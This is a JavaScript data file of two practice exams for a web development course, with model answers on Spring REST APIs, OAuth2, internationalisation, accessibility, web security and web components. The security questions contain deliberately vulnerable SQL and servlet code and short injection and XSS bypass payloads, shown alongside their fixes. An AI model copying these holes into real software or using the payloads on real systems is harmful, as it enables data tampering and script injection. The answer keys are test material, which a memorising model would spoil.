/* Nye øvingseksamener. Samme oppsett og oppgavetyper som h25/v26, med nye scenarioer.
   Alle oppgavetyper er hentet fra tidligere eksamener eller fra eksempelspørsmålene i partb-exam-info. */
window.DAT = window.DAT || {};
DAT.exams = DAT.exams || [];

const PW4_Q = `<p>Passwords can be stored securely by using 1) cryptographically secure hash, 2) slow hash algorithm, 3) unique per user salt, and 4) pepper. Explain the security benefits of using these four password storage features.</p>`;
const G11N_Q = `<p>In your own words, briefly explain what globalization, internationalization, and localization are.</p>`;

/* ======================= Øvingseksamen 1: Clinic ======================= */
DAT.exams.push({
  id: "n1", title: "Øvingseksamen 1 – Clinic", kind: "new", appendix: ["spring", "js"],
  questions: [
    { title: "Question 1 – Web Frameworks and Services", weight: 40,
      intro: `<div class="figure"><b>Clinic model</b><br>
Patient: <code>PK pid</code>, name, address, phone &nbsp;|&nbsp; Appointment: <code>PK aid</code>, <code>FK pid</code>, <code>FK did</code>, date, time, reason &nbsp;|&nbsp; Doctor: <code>PK did</code>, name, specialty</div>
<p>The above shows a simple patient–doctor entity model for building a clinic REST service (clinicapp). A patient can have many appointments (one-to-many between patient and appointment) and a doctor can have many appointments. Patients should be able to create a profile, update their information, book appointments, list their appointments, view an appointment, update an appointment and cancel appointments. The clinic staff should be able to list all the patients, and create, update, delete, list and view doctors.</p>`,
      tasks: [
        { label: "a", type: "text", q: `<p><b>Client-Side Rendering (CSR) vs. Server-Side Rendering (SSR):</b> Compare CSR and SSR using the following quality attributes: 1) User experience 2) Development effort 3) Compatibility.</p>`,
          sol: "@csrssrQuality" },
        { label: "b", type: "code", lang: "text", q: `<p>Build REST API endpoints for this service. The REST API should provide the following services:</p>
<p><b>Patient:</b> i. Register/create a profile; ii. View details about own profile; iii. Update profile information; iv. Book an appointment; v. Update an appointment; vi. Cancel an appointment; vii. List all appointments; viii. View a selected appointment.</p>
<p><b>Staff:</b> i. List all patients; ii. Create a new doctor; iii. Update a doctor; iv. Delete a doctor; v. List all doctors; vi. View a doctor.</p>
<p>Use the table structure below (example in the first row). You can have up to four levels (e.g. collection/identifier/collection/identifier).</p>`,
          starter: "Service | API Method | Endpoint (URI) | HTTP Method\nGet or view details about a patient | getPatient | patients/{pid} | GET\n",
          sol: `<table><tr><th>Service</th><th>API Method</th><th>Endpoint</th><th>HTTP</th></tr>
<tr><td>Create a profile</td><td>createPatient</td><td>/patients</td><td>POST</td></tr>
<tr><td>View own profile</td><td>getPatient</td><td>/patients/{pid}</td><td>GET</td></tr>
<tr><td>Update profile</td><td>updatePatient</td><td>/patients/{pid}</td><td>PUT</td></tr>
<tr><td>Book an appointment</td><td>createAppointment</td><td>/patients/{pid}/appointments</td><td>POST</td></tr>
<tr><td>Update an appointment</td><td>updateAppointment</td><td>/patients/{pid}/appointments/{aid}</td><td>PUT</td></tr>
<tr><td>Cancel an appointment</td><td>deleteAppointment</td><td>/patients/{pid}/appointments/{aid}</td><td>DELETE</td></tr>
<tr><td>List all appointments</td><td>getAppointments</td><td>/patients/{pid}/appointments</td><td>GET</td></tr>
<tr><td>View an appointment</td><td>getAppointment</td><td>/patients/{pid}/appointments/{aid}</td><td>GET</td></tr>
<tr><td>Staff: list all patients</td><td>getPatients</td><td>/patients</td><td>GET</td></tr>
<tr><td>Staff: create a doctor</td><td>createDoctor</td><td>/doctors</td><td>POST</td></tr>
<tr><td>Staff: update a doctor</td><td>updateDoctor</td><td>/doctors/{did}</td><td>PUT</td></tr>
<tr><td>Staff: delete a doctor</td><td>deleteDoctor</td><td>/doctors/{did}</td><td>DELETE</td></tr>
<tr><td>Staff: list all doctors</td><td>getDoctors</td><td>/doctors</td><td>GET</td></tr>
<tr><td>Staff: view a doctor</td><td>getDoctor</td><td>/doctors/{did}</td><td>GET</td></tr></table>` },
        { label: "c", type: "code", lang: "java", q: `<p>Assume the PatientService class is implemented in Spring Framework with the following methods (the method name, parameters and return types are sufficient to infer the behaviour):</p>
~~~java
public class PatientService {
    public Patient savePatient(Patient patient) {...}
    public List<Patient> findAll() {...}
    public Patient findById(Long pid) {...}
    public Patient updatePatient(Patient patient, Long pid) {...}
    public Set<Appointment> saveAppointment(Long pid, Appointment appointment) {...}   // incl. the new
    public Set<Appointment> findAppointments(Long pid) {...}
    public Appointment findAppointment(Long pid, Long aid) {...}
    public Appointment updateAppointment(Long pid, Long aid, Appointment appointment) {...}
    public Set<Appointment> deleteAppointment(Long pid, Long aid) {...}                // remaining
}
~~~
<p>Implement the controller class and the methods for all the <b>Patient</b> REST API endpoints that you identified in b) (including "list all patients"). Your methods must return the appropriate HttpStatus code. You can assume two exceptions – <code>PatientNotFoundException</code> and <code>AppointmentNotFoundException</code>.</p>`,
          starter: `@RestController
@RequestMapping("/clinicapp/api/v1")
public class PatientController {

    // Write your controller methods here

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/clinicapp/api/v1")
public class PatientController {

    @Autowired
    private PatientService patientService;

    @PostMapping("/patients")
    public ResponseEntity<Object> createPatient(@RequestBody Patient patient) {
        Patient npatient = patientService.savePatient(patient);
        return new ResponseEntity<>(npatient, HttpStatus.CREATED);
    }

    @GetMapping("/patients")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> getPatients() {
        List<Patient> patients = patientService.findAll();
        if (patients.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(patients, HttpStatus.OK);
    }

    @GetMapping("/patients/{pid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.pid == #pid")
    public ResponseEntity<Object> getPatient(@PathVariable("pid") Long pid)
            throws PatientNotFoundException {
        Patient patient = patientService.findById(pid);
        return new ResponseEntity<>(patient, HttpStatus.OK);
    }

    @PutMapping("/patients/{pid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.pid == #pid")
    public ResponseEntity<Object> updatePatient(@RequestBody Patient patient,
            @PathVariable("pid") Long pid) throws PatientNotFoundException {
        Patient upatient = patientService.updatePatient(patient, pid);
        return new ResponseEntity<>(upatient, HttpStatus.OK);
    }

    @PostMapping("/patients/{pid}/appointments")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.pid == #pid")
    public ResponseEntity<Object> createAppointment(@PathVariable("pid") Long pid,
            @RequestBody Appointment appointment) throws PatientNotFoundException {
        Set<Appointment> appointments = patientService.saveAppointment(pid, appointment);
        return new ResponseEntity<>(appointments, HttpStatus.CREATED);
    }

    @GetMapping("/patients/{pid}/appointments")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.pid == #pid")
    public ResponseEntity<Object> getAppointments(@PathVariable("pid") Long pid)
            throws PatientNotFoundException {
        Set<Appointment> appointments = patientService.findAppointments(pid);
        if (appointments.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(appointments, HttpStatus.OK);
    }

    @GetMapping("/patients/{pid}/appointments/{aid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.pid == #pid")
    public ResponseEntity<Object> getAppointment(@PathVariable("pid") Long pid,
            @PathVariable("aid") Long aid)
            throws PatientNotFoundException, AppointmentNotFoundException {
        Appointment appointment = patientService.findAppointment(pid, aid);
        return new ResponseEntity<>(appointment, HttpStatus.OK);
    }

    @PutMapping("/patients/{pid}/appointments/{aid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.pid == #pid")
    public ResponseEntity<Object> updateAppointment(@PathVariable("pid") Long pid,
            @PathVariable("aid") Long aid, @RequestBody Appointment appointment)
            throws PatientNotFoundException, AppointmentNotFoundException {
        Appointment uappointment = patientService.updateAppointment(pid, aid, appointment);
        return new ResponseEntity<>(uappointment, HttpStatus.OK);
    }

    @DeleteMapping("/patients/{pid}/appointments/{aid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.pid == #pid")
    public ResponseEntity<Object> deleteAppointment(@PathVariable("pid") Long pid,
            @PathVariable("aid") Long aid)
            throws PatientNotFoundException, AppointmentNotFoundException {
        Set<Appointment> appointments = patientService.deleteAppointment(pid, aid);
        return new ResponseEntity<>(appointments, HttpStatus.OK);
    }
}
~~~
<p class="small">@PreAuthorize-linjene hører til oppgave d II.</p>` },
        { label: "d I", type: "text", q: `<p>Assume the clinicapp service is using a 3rd party identity provider (IdP) for its users based on the OAuth2 protocol.</p><p>Briefly explain the authorization flow using the OAuth2 "authorization code grant type" between the resource owner and the IdP.</p>`, sol: "@authcodeFlow" },
        { label: "d II", type: "code", lang: "java", q: `<p>Assume there are two roles 'ADMIN' and 'USER' in the JWT access token, where ADMIN is assigned to the staff and USER to the patients. Protect the REST API endpoints in PatientController using relevant Spring annotations and the authentication object. The patient's id can be accessed as <code>authentication.details.pid</code>.</p>
<ol><li>An authenticated patient can only access own profile and appointments</li><li>Staff must be able to access the appointments of any patient</li><li>Only staff can list all patients</li></ol>`,
          starter: `@RestController
@RequestMapping("/clinicapp/api/v1")
public class PatientController {
    // update your controller methods with the appropriate
    // roles and Spring authorization annotations
}
`,
          sol: `<p>See the code in c):</p>
~~~java
// the patient's own profile and appointments
@PreAuthorize("hasAuthority('ADMIN') or authentication.details.pid == #pid")
// list all patients
@PreAuthorize("hasAuthority('ADMIN')")
~~~
<p><code>#pid</code> is the path variable of the method. Staff (ADMIN) can access all patients; a patient only when the pid in the URI is his own pid.</p>` }
      ]},
    { title: "Question 2 – Globalization", weight: 10, tasks: [
        { label: "a", type: "text", q: G11N_Q, sol: "@g11n" },
        { label: "b", type: "code", lang: "properties", q: `<p>As a developer, you have received a task to internationalize the 1-page web application below. Create the resource bundles (property files) for English and any other language of your choice.</p>
<div class="figure mock"><h2 style="margin:0">HVL Health Clinic</h2><p><b>Date: 12/12/2026</b></p><p>Hello Kari! You have 2 appointments this month.</p>
<table style="width:auto"><tr><th colspan="2">Next Appointment</th></tr><tr><td>Doctor</td><td>Dr. Hansen</td></tr><tr><td>Date</td><td>14/12/2026</td></tr><tr><td>Room</td><td>204</td></tr></table><p><a>Book appointment</a> | <a>Cancel appointment</a></p></div>`,
          starter: "# messages_en.properties\n\n\n# messages_no.properties\n",
          sol: `~~~properties
# messages_en.properties
clinic.title=HVL Health Clinic
clinic.date=Date: {0}
clinic.hello=Hello {0}! You have {1} appointments this month.
next.header=Next Appointment
next.doctor=Doctor
next.date=Date
next.room=Room
link.book=Book appointment
link.cancel=Cancel appointment

# messages_no.properties
clinic.title=HVL Helseklinikk
clinic.date=Dato: {0}
clinic.hello=Hei {0}! Du har {1} timer denne måneden.
next.header=Neste time
next.doctor=Lege
next.date=Dato
next.room=Rom
link.book=Bestill time
link.cancel=Avbestill time
~~~
<p class="small">Navn, datoer og tall (Kari, 12/12/2026, 2, Dr. Hansen, 204) er data/parametere – ikke tekst som oversettes.</p>` },
        { label: "c", type: "text", q: `<p>List the steps needed to internationalize a web application with the Spring Framework.</p>`, sol: "@i18nSteps" }
      ]},
    { title: "Question 3 – Universal Design", weight: 5, tasks: [
        { label: "a", type: "text", q: `<p>What is Universal Design?</p>`, sol: "@ud" },
        { label: "b", type: "text", q: `<p>Give 3 principles of UD.</p>`, sol: "@ud3" },
        { label: "c", type: "text", q: `<p>Briefly discuss the WCAG principle #3 – "Understandable" and the guidelines for this principle.</p>`, sol: "@understandable" }
      ]},
    { title: "Question 4 – Web security", weight: 25, tasks: [
        { label: "a", type: "text", q: `<p>A software development lifecycle consists of requirement, design, implementation, testing, and deployment/release phases. Mention one approach to identify security defects in each phase of the software development lifecycle.</p>`, sol: "@ssdlc" },
        { label: "b", type: "code", lang: "java", q: `<p>Given the SQL query below where the email and username are user supplied data:</p>
~~~java
String sqlQuery = "UPDATE CLINIC.PATIENT SET EMAIL = '" + email + "' WHERE USERNAME = '" + username + "'";
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.executeUpdate();
~~~
<p>I) Briefly explain why this SQL query can be vulnerable to injection.<br>II) Mitigate the SQL injection vulnerability by writing the mitigation code.</p>`,
          sol: `<p>The untrusted data (email and username) is concatenated into the SQL string before it is passed to <code>prepareStatement</code>. The input becomes part of the SQL code, so the PreparedStatement gives no protection. E.g. username <code>x' OR '1'='1</code> would update the email of all patients.</p>
~~~java
String sqlQuery = "UPDATE CLINIC.PATIENT SET EMAIL = ? WHERE USERNAME = ?";
PreparedStatement stmt = conn.prepareStatement(sqlQuery);
stmt.setString(1, email);
stmt.setString(2, username);
stmt.executeUpdate();
~~~` },
        { label: "c", type: "text", q: PW4_Q, sol: "@pw4" },
        { label: "d", type: "text", q: `<p>Inspect the two code snippets (snippet1 and snippet2) below.</p>
~~~java
private void snippet1(HttpServletRequest request, HttpServletResponse response) throws Throwable {
    String searchkey = request.getParameter("searchkey");
    if (searchkey != null) {
        response.getWriter().println("<p>You searched for: " + searchkey + "</p>");
    }
}

private void snippet2(HttpServletRequest request, HttpServletResponse response) throws Throwable {
    // comments written by the users, read from the database
    List<Comment> comments = commentDAO.getComments();
    for (Comment c : comments) {
        response.getWriter().println("<p>" + c.getText().replaceAll("(<script>)", "") + "</p>");
    }
}
~~~
<p>1. Are they vulnerable to XSS? Justify your answer, and give the type(s) of XSS.<br>2. Describe how output encoding works to mitigate XSS.</p>`,
          sol: [`<p><b>Yes, both are vulnerable.</b></p>
<p><b>Snippet 1:</b> untrusted data from the source (<code>getParameter</code>) is written to the page (the sink <code>getWriter</code>) with no validation and no output encoding. Type: <b>reflected XSS</b>.</p>
<p><b>Snippet 2:</b> the comments are untrusted data stored in the database and written to the page for every user who views it. Removing <code>&lt;script&gt;</code> is a weak mitigation that can be bypassed, e.g. with <code>&lt;scr&lt;script&gt;ipt&gt;</code>. Type: <b>stored XSS</b>.</p>`, "@outputEncoding"] },
        { label: "e", type: "text", q: `<p>A JSON Web Token (JWT) consists of three parts: Header.Claims.Signature</p><p>I) Describe the two different ways to calculate the signature part.<br>II) Assume the JWT is signed with the secret key "kronstad". Discuss the major threat to this token.</p>`, sol: ["@jwtSig", "@jwtWeak"] },
        { label: "f", type: "text", q: `<p>What assumptions or conditions are necessary for an attacker to exploit a Cross Site Request Forgery (CSRF) vulnerability in a web application?</p>`, sol: "@csrfConditions" }
      ]},
    { title: "Question 5 – JavaScript", weight: 20, tasks: [
        { label: "a (2%)", type: "code", lang: "javascript", q: `<p>A JavaScript main thread should send the text "welcome to dat152" to a worker thread. The worker thread should convert the text to upper case and return it. The main thread should then display the result in the browser console. Write JavaScript code for both the main thread and the worker thread.</p>`, starter: "// main.js\n\n\n// worker.js\n",
          sol: `~~~javascript
// main.js
const worker = new Worker("worker.js");
worker.addEventListener("message", (event) => {
    console.log(event.data);            // "WELCOME TO DAT152"
});
worker.postMessage("welcome to dat152");

// worker.js
self.addEventListener("message", (event) => {
    self.postMessage(event.data.toUpperCase());
});
~~~` },
        { label: "b (2%)", type: "code", lang: "javascript", q: `<p>The code below is found in a web application:</p>
~~~javascript
const patient = await loadPatient(id);
~~~
<p>What kind of object must be returned by <code>loadPatient(id)</code>? Write code for a possible loadPatient function. The object returned should include some asynchronous code.</p>`,
          sol: `<p>It must return a <b>Promise</b>. A Promise represents asynchronous code that will eventually resolve (fulfil) or reject (fail); await returns the resolved value.</p>
~~~javascript
function loadPatient(id) {
    return new Promise((resolve, reject) => {
        setTimeout(() => {
            resolve({ id: id, name: "Kari" });
        }, 1000);
    });
}
// or with fetch, returning the Promise without await:
// function loadPatient(id) { return fetch("../api/patient?id=" + id); }
~~~` },
        { label: "c (2%)", type: "text", q: `<p>What is shadow DOM, what are the consequences of using shadow DOM, and what differentiates the open and closed modes of shadow DOM?</p>`, sol: "@shadowDom" },
        { label: "d (2%)", type: "text", q: `<p>An HTML file includes the following HTML:</p><p><code>&lt;script src="components/appointments.js" type="module"&gt;&lt;/script&gt;</code></p><p>i. Where in the HTML code would you put the above script tag? You must justify the answer.<br>ii. What are the consequences of the attribute type="module"?</p>`, sol: "@scriptModule" },
        { label: "e (2%)", type: "text", q: `<p>JavaScript and routing:</p><p>i. What is meant by routing in the context of a single page application (SPA)? Why do we need routing?<br>ii. What approaches can be used to implement routing in plain JavaScript, i.e. no use of external libraries or frameworks?</p>`, sol: "@routing" },
        { label: "f (10%)", type: "code", lang: "javascript",
          q: `<p>In this task you are asked to write the JavaScript code of a GUI component <b>AppointmentList</b> (custom tag <code>appointment-list</code>) that displays the appointments of a patient.</p>
<div class="figure mock"><table style="width:auto"><tr><th>Doctor</th><th>Time</th><th></th></tr><tr><td>Dr. Hansen</td><td>2026-12-14 10:30</td><td><button type="button" disabled>Cancel</button></td></tr><tr><td>Dr. Lie</td><td>2026-12-20 09:00</td><td><button type="button" disabled>Cancel</button></td></tr></table></div>
<p>An appointment is represented by an object:</p>
~~~javascript
{ "id": 4, "doctor": "Dr. Hansen", "time": "2026-12-14 10:30" }
~~~
<p>The property id is the unique id of the appointment. It must be stored with the appointment as the HTML custom data attribute <code>data-id</code>.</p>
<p>The HTML element class of AppointmentList has three public methods:</p>
<ul><li><code>showappointment(appointment)</code>: If no appointment with the same id is on display, the appointment is added to the <b>end</b> of the list. If the id already exists in the list, no new row is added, but the doctor and time are modified according to the new data. In parameter: Object. Return value: None.</li>
<li><code>removeappointment(id)</code>: Removes the appointment with the given id from the view. In parameter: Integer. Return value: None.</li>
<li><code>addcancelcallback(callback)</code>: Adds a callback that is run when the user clicks a button Cancel. The callback must be run with the id of the appointment as argument. This method does not update the view. In parameter: Function. Return value: Not required.</li></ul>
<p><b>Task:</b> Fill in the missing code.</p>`,
          starter: `const template = document.createElement("template");
template.innerHTML = \`
    <table id="appointments">
        <thead>
            <tr><th>Doctor</th><th>Time</th></tr>
        </thead>
        <tbody></tbody>
    </table>\`;

const appointmentrow = document.createElement("template");
appointmentrow.innerHTML = \`
    <tr>
        <td></td>
        <td></td>
        <td><button type="button">Cancel</button></td>
    </tr>\`;

class AppointmentList extends HTMLElement {
    // Add the necessary private fields

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        // More code, if necessary
    }

    addcancelcallback(callback) {
        // More code
    }

    showappointment(appointment) {
        // More code
    }

    removeappointment(id) {
        // More code
    }

    // More code, if necessary
}
customElements.define('appointment-list', AppointmentList);
`,
          sol: `~~~javascript
class AppointmentList extends HTMLElement {
    #callbacks = new Map();
    #tbody;

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        this.#tbody = shadow.getElementById("appointments").tBodies[0];
    }

    addcancelcallback(callback) {
        const callbackid = Symbol("cancelcallback");
        this.#callbacks.set(callbackid, callback);
        return callbackid;
    }

    showappointment(appointment) {
        let row = this.#tbody.querySelector(\`tr[data-id="\${appointment.id}"]\`);
        if (row === null) {
            // new appointment: create a row from the template
            const content = appointmentrow.content.cloneNode(true);
            row = content.firstElementChild;
            row.dataset.id = appointment.id;
            const bt = row.cells[2].getElementsByTagName("button")[0];
            bt.addEventListener("click", () => { this.#oncancel(appointment.id) });
            this.#tbody.append(row);
        }
        // new or existing row: set doctor and time
        row.cells[0].textContent = appointment.doctor;
        row.cells[1].textContent = appointment.time;
    }

    removeappointment(id) {
        const row = this.#tbody.querySelector(\`tr[data-id="\${id}"]\`);
        if (row !== null) {
            row.remove();
        }
    }

    #oncancel(id) {
        this.#callbacks.forEach(callback => callback(id));
    }
}
customElements.define('appointment-list', AppointmentList);
~~~` }
      ]}
  ]
});

/* ======================= Øvingseksamen 2: Tickets ======================= */
DAT.exams.push({
  id: "n2", title: "Øvingseksamen 2 – Tickets", kind: "new", appendix: ["spring", "js"],
  questions: [
    { title: "Question 1 – Web Frameworks and Services", weight: 40,
      intro: `<div class="figure"><b>Ticket model</b><br>
Customer: <code>PK cid</code>, cname, email &nbsp;|&nbsp; Booking: <code>PK bid</code>, <code>FK cid</code>, <code>FK eid</code>, quantity, total_price, date &nbsp;|&nbsp; Event: <code>PK eid</code>, title, venue, price, available_seats</div>
<p>The above shows a simple customer–event entity model for building a ticket REST service (ticketapp). A customer can make many bookings (one-to-many between customer and booking) and an event can be booked by many customers. An event has a number of available seats. For every booking, the total price is computed based on the event's price and the number of tickets (quantity) booked, and the event's available seats are reduced. Customers should be able to create a profile, update their information, make bookings, list their bookings, view a booking and cancel bookings. The staff should be able to list all the customers, and create, update, delete, list and view events.</p>`,
      tasks: [
        { label: "a", type: "text", q: `<p><b>REST Maturity:</b> Discuss briefly level 2 and level 3 (HATEOAS) of the Richardson Maturity Model (RMM). What must a REST API fulfil at each of these levels?</p>`,
          sol: "@rmm23" },
        { label: "b", type: "code", lang: "text", q: `<p>Build REST API endpoints for this service. The REST API should provide the following services:</p>
<p><b>Customer:</b> i. Register/create a profile; ii. View details about own profile; iii. Update profile information; iv. Make a booking for an event. The following must be fulfilled when implementing in c I: (1) must be possible only if the event has enough available seats, (2) must set the total price based on the quantity booked, (3) must update (reduce) the event's available seats; v. List all bookings; vi. View a selected booking; vii. Cancel a booking.</p>
<p><b>Staff:</b> i. List all customers; ii. Create a new event; iii. Update an event; iv. Delete an event; v. List all events; vi. View an event.</p>`,
          starter: "Service | API Method | Endpoint (URI) | HTTP Method\nGet or view details about a customer | getCustomer | customers/{cid} | GET\n",
          sol: `<table><tr><th>Service</th><th>API Method</th><th>Endpoint</th><th>HTTP</th></tr>
<tr><td>Create a profile</td><td>createCustomer</td><td>/customers</td><td>POST</td></tr>
<tr><td>View own profile</td><td>getCustomer</td><td>/customers/{cid}</td><td>GET</td></tr>
<tr><td>Update profile</td><td>updateCustomer</td><td>/customers/{cid}</td><td>PUT</td></tr>
<tr><td>Make a booking</td><td>createBooking</td><td>/customers/{cid}/bookings</td><td>POST</td></tr>
<tr><td>List all bookings</td><td>getBookings</td><td>/customers/{cid}/bookings</td><td>GET</td></tr>
<tr><td>View a booking</td><td>getBooking</td><td>/customers/{cid}/bookings/{bid}</td><td>GET</td></tr>
<tr><td>Cancel a booking</td><td>deleteBooking</td><td>/customers/{cid}/bookings/{bid}</td><td>DELETE</td></tr>
<tr><td>Staff: list all customers</td><td>getCustomers</td><td>/customers</td><td>GET</td></tr>
<tr><td>Staff: create an event</td><td>createEvent</td><td>/events</td><td>POST</td></tr>
<tr><td>Staff: update an event</td><td>updateEvent</td><td>/events/{eid}</td><td>PUT</td></tr>
<tr><td>Staff: delete an event</td><td>deleteEvent</td><td>/events/{eid}</td><td>DELETE</td></tr>
<tr><td>Staff: list all events</td><td>getEvents</td><td>/events</td><td>GET</td></tr>
<tr><td>Staff: view an event</td><td>getEvent</td><td>/events/{eid}</td><td>GET</td></tr></table>` },
        { label: "c I", type: "code", lang: "java", q: `<p>Assume the CustomerService class and the EventService class are implemented in Spring Framework with the following methods:</p>
~~~java
public class CustomerService {
    public Customer saveCustomer(Customer customer) {...}
    public List<Customer> findAll() {...}
    public Customer findById(Long cid) {...}
    public Customer updateCustomer(Customer customer, Long cid) {...}
    public Set<Booking> saveBooking(Long cid, Booking booking) {...}     // incl. the new booking
    public Set<Booking> findBookings(Long cid) {...}
    public Booking findBooking(Long cid, Long bid) {...}
    public Set<Booking> deleteBooking(Long cid, Long bid) {...}          // remaining bookings
}
public class EventService {
    public Event saveEvent(Event event) {...}
    public Event updateEvent(Event event, Long eid) {...}
    public List<Event> findAll() {...}
    public void deleteById(Long eid) {...}
    public Event findEventById(Long eid) {...}
}
~~~
<p>Implement the controller class and the methods for all the <b>Customer</b> REST API endpoints that you identified in b). Your methods must return the appropriate HttpStatus code. You can assume three exceptions – <code>CustomerNotFoundException</code>, <code>EventNotFoundException</code> and <code>BookingNotFoundException</code> – and getters and setters for the fields of the model classes.</p>`,
          starter: `@RestController
@RequestMapping("/ticketapp/api/v1")
public class CustomerController {

    // Write your controller methods here

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/ticketapp/api/v1")
public class CustomerController {

    @Autowired
    private CustomerService customerService;
    @Autowired
    private EventService eventService;

    @PostMapping("/customers")
    public ResponseEntity<Object> createCustomer(@RequestBody Customer customer) {
        Customer ncustomer = customerService.saveCustomer(customer);
        return new ResponseEntity<>(ncustomer, HttpStatus.CREATED);
    }

    @GetMapping("/customers")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> getCustomers() {
        List<Customer> customers = customerService.findAll();
        if (customers.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(customers, HttpStatus.OK);
    }

    @GetMapping("/customers/{cid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> getCustomer(@PathVariable("cid") Long cid)
            throws CustomerNotFoundException {
        Customer customer = customerService.findById(cid);
        return new ResponseEntity<>(customer, HttpStatus.OK);
    }

    @PutMapping("/customers/{cid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> updateCustomer(@RequestBody Customer customer,
            @PathVariable("cid") Long cid) throws CustomerNotFoundException {
        Customer ucustomer = customerService.updateCustomer(customer, cid);
        return new ResponseEntity<>(ucustomer, HttpStatus.OK);
    }

    @PostMapping("/customers/{cid}/bookings")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> createBooking(@PathVariable("cid") Long cid,
            @RequestBody Booking booking)
            throws CustomerNotFoundException, EventNotFoundException {

        Event event = eventService.findEventById(booking.getEid());

        // 1. only if the event has enough available seats
        if (event.getAvailable_seats() < booking.getQuantity())
            return new ResponseEntity<>(HttpStatus.BAD_REQUEST);

        // 2. set the total price based on the quantity booked
        booking.setTotal_price(event.getPrice() * booking.getQuantity());

        // 3. reduce the event's available seats
        event.setAvailable_seats(event.getAvailable_seats() - booking.getQuantity());
        eventService.updateEvent(event, event.getEid());

        Set<Booking> bookings = customerService.saveBooking(cid, booking);
        return new ResponseEntity<>(bookings, HttpStatus.CREATED);
    }

    @GetMapping("/customers/{cid}/bookings")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> getBookings(@PathVariable("cid") Long cid)
            throws CustomerNotFoundException {
        Set<Booking> bookings = customerService.findBookings(cid);
        if (bookings.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(bookings, HttpStatus.OK);
    }

    @GetMapping("/customers/{cid}/bookings/{bid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> getBooking(@PathVariable("cid") Long cid,
            @PathVariable("bid") Long bid)
            throws CustomerNotFoundException, BookingNotFoundException {
        Booking booking = customerService.findBooking(cid, bid);
        return new ResponseEntity<>(booking, HttpStatus.OK);
    }

    @DeleteMapping("/customers/{cid}/bookings/{bid}")
    @PreAuthorize("hasAuthority('ADMIN') or authentication.details.cid == #cid")
    public ResponseEntity<Object> deleteBooking(@PathVariable("cid") Long cid,
            @PathVariable("bid") Long bid)
            throws CustomerNotFoundException, BookingNotFoundException {
        Set<Booking> bookings = customerService.deleteBooking(cid, bid);
        return new ResponseEntity<>(bookings, HttpStatus.OK);
    }
}
~~~` },
        { label: "c II", type: "code", lang: "java", q: `<p>Implement the controller class and the methods for the <b>Event</b> REST API endpoints that you identified in b).</p>`,
          starter: `@RestController
@RequestMapping("/ticketapp/api/v1")
public class EventController {

    // Write your controller methods here

}
`,
          sol: `~~~java
@RestController
@RequestMapping("/ticketapp/api/v1")
public class EventController {

    @Autowired
    private EventService eventService;

    @GetMapping("/events")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> getEvents() {
        List<Event> events = eventService.findAll();
        if (events.isEmpty())
            return new ResponseEntity<>(HttpStatus.NO_CONTENT);
        return new ResponseEntity<>(events, HttpStatus.OK);
    }

    @GetMapping("/events/{eid}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> getEvent(@PathVariable("eid") Long eid)
            throws EventNotFoundException {
        Event event = eventService.findEventById(eid);
        return new ResponseEntity<>(event, HttpStatus.OK);
    }

    @PostMapping("/events")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> createEvent(@RequestBody Event event) {
        Event nevent = eventService.saveEvent(event);
        return new ResponseEntity<>(nevent, HttpStatus.CREATED);
    }

    @PutMapping("/events/{eid}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> updateEvent(@RequestBody Event event,
            @PathVariable("eid") Long eid) throws EventNotFoundException {
        Event uevent = eventService.updateEvent(event, eid);
        return new ResponseEntity<>(uevent, HttpStatus.OK);
    }

    @DeleteMapping("/events/{eid}")
    @PreAuthorize("hasAuthority('ADMIN')")
    public ResponseEntity<Object> deleteEvent(@PathVariable("eid") Long eid)
            throws EventNotFoundException {
        eventService.deleteById(eid);
        return new ResponseEntity<>(HttpStatus.OK);
    }
}
~~~` },
        { label: "d I", type: "text", q: `<p>Assume the ticketapp service is using a 3rd party identity provider (IdP) for its users based on the OAuth2 protocol.</p><p>What is the difference between the Authorization code flow and the Implicit grant flow?</p>`, sol: "@codeVsImplicit" },
        { label: "d II", type: "code", lang: "java", q: `<p>Assume there are two roles 'ADMIN' and 'USER' in the JWT access token, where ADMIN is assigned to the staff and USER to the customers. Protect the REST API endpoints in the CustomerController and the EventController classes using relevant Spring annotations and the authentication object. The customer id can be accessed as <code>authentication.details.cid</code>. The permissions must fulfil these conditions:</p>
<ol><li>An authenticated customer can only access own bookings</li><li>Staff must be able to access the bookings of any customer</li><li>Only staff can access the event endpoints and list all customers</li></ol>`,
          starter: "// update the controller methods in CustomerController and EventController\n// with the appropriate roles and Spring authorization annotations\n",
          sol: `<p>See the annotations in c I and c II:</p>
~~~java
// the customer's own profile and bookings
